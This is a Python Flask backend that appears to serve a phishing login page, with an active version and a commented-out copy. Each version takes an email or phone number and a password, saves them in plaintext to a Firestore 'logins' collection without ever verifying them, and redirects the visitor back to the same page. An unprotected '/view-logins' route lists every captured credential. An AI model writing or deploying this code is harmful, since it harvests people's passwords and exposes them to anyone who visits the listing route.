# this is with default time
import os
import json
import re
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, jsonify
import firebase_admin
from firebase_admin import credentials, firestore

# Initialize Flask app
app = Flask(__name__)

# Use environment variable to load Firebase service account credentials
firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')

# Initialize Firebase
if firebase_creds:
    try:
        # Parse the JSON safely using json.loads()
        cred = credentials.Certificate(json.loads(firebase_creds))
        firebase_admin.initialize_app(cred)
        
        # Initialize Firestore
        db = firestore.client()
    except Exception as e:
        print(f"Failed to initialize Firebase: {e}")
else:
    print("Firebase credentials not found.")

# Route for the login page
@app.route('/')
def login():
    return render_template('index.html')

# Route to handle login form submission
@app.route('/login', methods=['POST'])
def login_post():
    try:
        email_or_phone = request.form['email_or_phone']
        password = request.form['password']

        # Check if the input is an email or a phone number
        if re.match(r'^[\d]{10,15}$', email_or_phone):  # Phone number validation
            data = {'phone': email_or_phone, 'password': password}
        elif re.match(r'^[^@]+@[^@]+\.[^@]+$', email_or_phone):  # Email validation
            data = {'email': email_or_phone, 'password': password}
        else:
            return "Invalid email or phone number format.", 400

        # Add a timestamp to the data
        data['timestamp'] = firestore.SERVER_TIMESTAMP

        # Save login data to Firestore
        db.collection('logins').add(data)
        
        # Redirect back to the login page after form submission
        return redirect(url_for('login'))
    
    except Exception as e:
        return f"An error occurred: {e}"

# Route to view stored login data (For Testing purposes)
@app.route('/view-logins', methods=['GET'])
def view_logins():
    try:
        # Fetch all logins, ordered by the timestamp field in descending order (latest first)
        logins_ref = db.collection('logins').order_by('timestamp', direction=firestore.Query.DESCENDING)
        docs = logins_ref.stream()

        # Collect and format each document
        logins = {}
        for doc in docs:
            login_data = doc.to_dict()
            # Convert the Firestore timestamp to a readable format (optional)
            if 'timestamp' in login_data and login_data['timestamp'] is not None:
                login_data['timestamp'] = login_data['timestamp'].strftime("%Y-%m-%d %H:%M:%S")
            logins[doc.id] = login_data

        # Format the JSON with new lines between each entry for readability
        formatted_logins = json.dumps(logins, indent=2).replace("},", "},\n")

        # Return the formatted logins as plain text for readability
        return f"<pre>{formatted_logins}</pre>"
    
    except Exception as e:
        return f"An error occurred: {e}"

if __name__ == '__main__':
    app.run(debug=True)


#this is with no time
# import os
# import json
# import re
# from flask import Flask, render_template, request, redirect, url_for, jsonify
# import firebase_admin
# from firebase_admin import credentials, firestore

# # Initialize Flask app
# app = Flask(__name__)

# # Global variable for Firestore client
# db = None

# # Use environment variable to load Firebase service account credentials
# firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')

# if firebase_creds:
#     try:
#         # Parse the JSON safely using json.loads()
#         cred = credentials.Certificate(json.loads(firebase_creds))
#         firebase_admin.initialize_app(cred)
        
#         # Initialize Firestore and set it globally
#         db = firestore.client()
#         print("Firestore initialized successfully.")
#     except Exception as e:
#         print(f"Failed to initialize Firebase: {e}")
# else:
#     print("Firebase credentials not found.")

# # Route for the login page
# @app.route('/')
# def login():
#     return render_template('index.html')

# # Route to handle login form submission
# @app.route('/login', methods=['POST'])
# def login_post():
#     global db
#     if not db:
#         return "Database not initialized.", 500

#     try:
#         email_or_phone = request.form['email_or_phone']
#         password = request.form['password']

#         # Check if the input is an email or a phone number
#         if re.match(r'^[\d]{10,15}$', email_or_phone):  # Phone number validation
#             data = {'phone': email_or_phone, 'password': password}
#         elif re.match(r'^[^@]+@[^@]+\.[^@]+$', email_or_phone):  # Email validation
#             data = {'email': email_or_phone, 'password': password}
#         else:
#             return "Invalid email or phone number format.", 400

#         # Save login data to Firestore
#         db.collection('logins').add(data)
        
#         # Redirect back to the login page after form submission
#         return redirect(url_for('login'))
    
#     except Exception as e:
#         return f"An error occurred: {e}", 500

# # Route to view stored login data (For Testing purposes)
# @app.route('/view-logins', methods=['GET'])
# def view_logins():
#     global db
#     if not db:
#         return "Database not initialized.", 500

#     try:
#         logins_ref = db.collection('logins')
#         docs = logins_ref.stream()
#         logins = {doc.id: doc.to_dict() for doc in docs}

#         # Return the logins as JSON
#         return jsonify(logins)
    
#     except Exception as e:
#         return f"An error occurred: {e}", 500

# if __name__ == '__main__':
#     app.run(debug=True)

